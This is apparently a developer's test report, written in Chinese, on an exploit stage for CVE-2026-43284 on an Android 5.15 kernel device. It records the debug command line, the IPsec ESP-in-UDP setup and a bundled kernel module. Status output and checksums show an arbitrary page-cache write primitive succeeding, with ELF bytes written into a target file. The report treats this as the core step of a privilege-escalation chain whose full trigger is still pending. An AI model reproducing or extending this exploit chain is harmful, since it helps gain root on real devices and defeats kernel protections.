# B5-9d-write 真机门禁：CVE-2026-43284 页缓存写原语 — PASS

对应提交 `0ed1588`（Kotlin flag 透传）+ `ba67883`（dev-target 放宽）。入口：debug-only `DevCve43284Activity`，
`--run-cve-2026-43284 /data/local/tmp/helper.ko /data/local/tmp/target.bin --stage=write --allow-dev-target`。

## 设备与准备

- A301SO / `5.15.189-android13-8-00016-g51bba4309aac-ab14546557`；Shizuku READY（uid 2000）；**KernelSU 仍加载**（本轮非冷机）。
- App 内 `IpSecManager` 建 transport-mode SA（AES-CBC + HMAC-SHA256，ICV=16）→ 84B 会话帧经 Shizuku UserService 管道给 native stdin。
- `.ko`：内置 `dirtyfrag-android13-5.15.ko`（11168B，sha256 `93c5dccd…`）；目标：`/data/local/tmp/target.bin`（一次性，11168B 全零，`--allow-dev-target` 才允许非 vendor 路径）。

## 结果：PASS（exit 0）

```
GLK_STATUS run.cve_2026_43284 stage=write
GLK_STATUS run.module path=/data/local/tmp/helper.ko bytes=11168 wrote=1 verified=1
GLK_STATUS run.target path=/data/local/tmp/target.bin
GLK_STATUS run.dev_target allow=1
GLK_STATUS run.chain written=698 verified=698 rolled_back=0 cleanup=1 journal_overflow=1 rollback_incomplete=0
GLK_STATUS run.cve_2026_43284 ok error=None
```

- 698 块 × 16B = **11168B = `.ko` 大小**；写后读回逐块校验通过。
- 目标 md5 `bf1f588a12c9521576d37005951f4c76` → `657313f101f1f54a224587672a5e6b94`；首 4 字节变为 `7f 45 4c 46`（**ELF magic**），随后 `02 01 01`（ELF64 LE）、`b7 00`（AArch64）——即 `.ko` 内容被真实写入目标页缓存。

## 结论与限制

- **ESP-in-UDP + CBC-IV 的任意 16B 页缓存写在 A301SO 上成立**（非破坏性目标、可读回验证）；这是 43284 链的核心原语。
- `journal_overflow=1`：回滚日志上限 128 块，本目标 698 块溢出；写/校验仍通过，但**回滚不完整**（已如实记录）——正式链路需按需扩充日志或分段。
- 本轮为**非冷机**（KernelSU 已加载），仅证明写原语；**完整提权判定仍需冷机 + `trigger`/`full`**。
- 仍未触碰任何系统/vendor 文件；未加载模块、未 fork/exec 目标。
